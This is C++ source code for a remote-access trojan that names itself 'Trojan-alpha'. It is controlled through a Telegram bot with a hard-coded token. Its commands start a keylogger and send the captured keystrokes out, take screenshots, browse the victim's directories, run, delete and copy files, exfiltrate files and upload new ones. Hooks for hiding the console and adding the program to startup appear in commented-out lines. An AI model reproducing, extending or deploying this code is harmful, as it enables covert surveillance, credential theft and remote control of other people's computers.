#include <iostream>
#include <tgbot/tgbot.h>
#include <filesystem>

#include "keyLogger.h"
#include "globals.h"
#include "console.h"
#include "startup.h"
#include "conversions.h"
#include "screenshot.h"
#include "modes.h"


// Auxiliary function that analyzes and handles main funtions' results
void handleResult(Result result, const TgBot::Bot& bot, int64_t chatId) {
	if (result.code == COE::Success) {
		switch (result.response_type) {
		case ResponseType::Text:
			bot.getApi().sendMessage(chatId, result.response);
			break;
		case ResponseType::Path:
			result = sendFile(bot, result.response, chatId);
			handleResult(result, bot, chatId);
		}
		return;
	}

	std::string details = result.errorDetails;
	std::wstring wdetails = utf8_to_wstring(details);
	details = wstringToUtf8(wdetails);

	std::string message;
	switch (result.code) {
	case COE::EmptyInput:	   message = "Invalid input: empty or null message. "; break;

	case COE::EmptyDirectory:  message = "Directory is empty. "; break;

	case COE::PathNotFound:	   message = "Path does not exist. "; break;

	case COE::NotADirectory:   message = "The path is not a directory. "; break;

	case COE::ConversionError: message = "Error converting path to wide string. "; break;

	case COE::FilesystemError: message = "Filesystem error. "; break;

	case COE::UnexpectedError: message = "Unexpected error. "; break;

	case COE::ExecutionError:  message = "Execution error. "; break;

	case COE::UnknownError:	   message = "Unknown error occurred. "; break;

	case COE::OpenFileError:   message = "Error opening a file. "; break;

	case COE::LimitError:	   message = "Error: Telegram limit exceeded for message size. "; break;

	case COE::NotARegularFile: message = "The path is not a regular file. "; break;

	case COE::RemoveFileError: message = "Cannot delete the file. "; break;

	case COE::NotAFile:		   message = "Please send a file first. "; break;
	}
	bot.getApi().sendMessage(chatId, message + details);
}


// Main function
void startBot(std::string token)
{
	using namespace std;
	namespace fs = std::filesystem;

	TgBot::Bot bot(token);


	bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id,
				std::string("Hello, welcome to Trojan-alpha. Here's the commands you can use:\n")
				+ "/start_key_logger - starts key logger;\n"
				+ "/kill_key_logger - kills key logger;\n"
				+ "/send_scr - makes and sends screenshot;\n"
				+ "/send_key_logger - sends a file with key logs;\n"
				+ "/check_dir_mode - opens check directory mode;\n"
				+ "/full_check_dir_mode - opens full check directory mode;\n"
				+ "/start_file_mode - opens start file mode;\n"
				+ "/delete_file_mode - opens delete file mode;\n"
				+ "/copy_file_mode - opens copy file mode;\n"
				+ "/send_file_mode - opens send file mode;\n"
				+ "/upload_file_mode - opens upload file mode;\n"
				+ "/play_music_mode - opens play music mode;\n"
				+ "/stop_music - stops music;\n"
				+ "/exit_mode - exits your current mode.\n");
			bot.getApi().sendMessage(message->chat->id, "ChatID: " + std::to_string(message->chat->id));
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");

		});


	bot.getEvents().onCommand("start_key_logger", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			int64_t chat_id = message->chat->id;

			bot.getApi().sendMessage(chat_id, "Starting Key Logger.");
			isKeyLoggerRunning = true;

			thread keyLogger(startKeyLogger, std::ref(bot), chat_id);
			keyLogger.detach();
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("kill_key_logger", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			isKeyLoggerRunning = false;
			bot.getApi().sendMessage(message->chat->id, "Killing current key_logger session.");
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode");
		});


	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			ifstream inFile(filename);

			if (!inFile) {
				bot.getApi().sendMessage(message->chat->id, "Error: Cannot open file!");
				return;
			}

			if (inFile.peek() == std::ifstream::traits_type::eof())
				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
			else
				bot.getApi().sendDocument(message->chat->id, TgBot::InputFile::fromFile(filename, "text/plain"));
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");

		});


	bot.getEvents().onCommand("send_scr", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{	
			try {
				takeScreenshot(scrname);
				Result result = sendFile(bot, scrname, message->chat->id);
				handleResult(result, bot, message->chat->id);
				result = deleteFile(scrname);
				handleResult(result, bot, message->chat->id);
			}
			catch (const std::exception& e) {
				bot.getApi().sendMessage(message->chat->id, std::string("Error: ") + e.what());
			}
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("check_dir_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
			currentMode = Mode::CHECK_DIR;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("full_check_dir_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
			currentMode = Mode::FULL_CHECK_DIR;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("start_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to start.");
			currentMode = Mode::START_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("delete_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to delete.");
			currentMode = Mode::DELETE_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("copy_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to copy.");
			currentMode = Mode::COPY_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("send_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to download.");
			currentMode = Mode::SEND_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("upload_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a file you want to upload.");
			currentMode = Mode::UPLOAD_FILE;
			isWaitingForFile = true;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("play_music_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == Mode::STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path to mp3 you want to play.");
			currentMode = Mode::PLAY_MUSIC;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	/*bot.getEvents().onCommand("conversation_mode", [&bot](TgBot::Message::Ptr message) {

		if (currentMode == MODE_STANDARD)
		{
			ShowConsole();
			isConversationRunning = true;
			thread listenThread(listenMode, ref(bot), message->chat->id);
			listenThread.detach();
			currentMode = MODE_CONVERSATION;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});*/


	// ALL messages from the user are processed here FIRST.
	bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {

		if (!message) {
			bot.getApi().sendMessage(message->chat->id, "Invalid input: empty or null message.");
			return;
		}

		// These commands are here for easement.
		else if (message->text == "/exit_mode") {
			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode.");
			currentMode = Mode::STANDARD;
			isConversationRunning = false;
			return;
		}


		else if (message->text == "/stop_music") {
			if (isMusicPlaying)
			{
				try {
					mciSendString(L"close myMP3", NULL, 0, NULL);
					bot.getApi().sendMessage(message->chat->id, "Music has been successfully stopped.");
				}
				catch (const std::exception& e) {
					bot.getApi().sendMessage(message->chat->id, string("Error: ") + e.what());
				}
			}
			else
				bot.getApi().sendMessage(message->chat->id, "Music is not playing right now.");
			return;
		}


		Result result;
		switch (currentMode) 
		{
		case Mode::CHECK_DIR:
			result = checkDir(message->text);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::FULL_CHECK_DIR:
			result = fullCheckDir(message->text);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::START_FILE:
			result = startFile(message->text);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::DELETE_FILE:
			result = deleteFile(message->text);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::COPY_FILE:
			result = copyFile(message->text);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::SEND_FILE:
			result = sendFile(bot, message->text, message->chat->id);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::UPLOAD_FILE:
			result = uploadFile(bot, message);
			handleResult(result, bot, message->chat->id);
			break;
		case Mode::PLAY_MUSIC:
			playMusic(bot, message);
			//handleResult(result, bot, message->chat->id);
			break;
		}
		});


	try {
		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
		bot.getApi().sendMessage(sashaId, "TgBot has been launched.");
		TgBot::TgLongPoll longPoll(bot);
		while (true) {
			longPoll.start();
		}
	}
	catch (TgBot::TgException& e) {
		printf("error: %s\n", e.what());
	}
}

int main()
{
	setlocale(LC_ALL, "Russian");
	//HideConsole();

	//AddToStartup(L"System", L"path\\to\\your\\program.exe");

	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");

	return 0;
}
